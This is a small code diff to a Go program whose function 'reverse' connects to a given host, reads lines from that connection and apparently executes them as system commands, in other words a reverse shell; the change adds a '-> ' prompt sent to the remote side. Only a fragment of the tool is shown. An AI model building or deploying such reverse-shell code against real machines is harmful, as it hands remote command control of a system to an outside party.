@@ -2,6 +2,7 @@ package main
 
 import (
 	"bufio"
+	"fmt"
 	"net"
 	"os/exec"
 	"syscall"
@@ -20,6 +21,7 @@ func reverse(host string) {
 
 	bufReader := bufio.NewReader(c)
 	for {
+		fmt.Fprint(c, "-> ")
 		externCmd, err := bufReader.ReadString('\n')
 		if err != nil {
 			c.Close()
